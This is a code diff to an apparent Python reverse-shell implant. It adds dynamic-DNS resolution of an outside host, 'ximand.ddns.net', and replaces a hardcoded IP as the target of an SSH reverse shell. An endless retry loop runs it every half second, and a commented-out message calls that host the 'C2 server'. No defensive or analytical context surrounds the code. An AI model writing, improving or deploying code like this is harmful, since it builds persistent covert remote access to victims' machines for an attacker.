@@ -10,6 +10,7 @@ import os
 import sys
 import time
 import signal
+import socket
 import threading
 import paramiko
 import subprocess
@@ -51,6 +52,16 @@ def signal_handler(sig, frame):
 
 # Register the signal handler for SIGINT (Ctrl+C)
 signal.signal(signal.SIGINT, signal_handler)
+
+
+def resolve_ip(domain_name):
+    try:
+        # Get the IP address of the given domain
+        ip_address = socket.gethostbyname(domain_name)
+        return ip_address
+    except socket.gaierror:
+        # Handle exception if domain resolution fails
+        return f"Error: Unable to resolve domain '{domain_name}'"
 
 
 def exec_underlying_command(command):
@@ -176,14 +187,15 @@ if __name__ == "__main__":
 
     #global user
     auth_path = os.path.join(parent_dir, 'mechanism')
+    host = resolve_ip('ximand.ddns.net')
 
     # Try forever the commands
     while True:
         try:
-            ssh_rev_shell('34.204.78.186', 'ubuntu', auth_path, user, 64000)
+            ssh_rev_shell(host, 'ubuntu', auth_path, user, 64000)
         except Exception as e:
             pass
             #print(f"[!] Reconnection to C2 server failed!\n{e}\n")
 
         # How frequent request a command
-        time.sleep(2)
+        time.sleep(0.5)
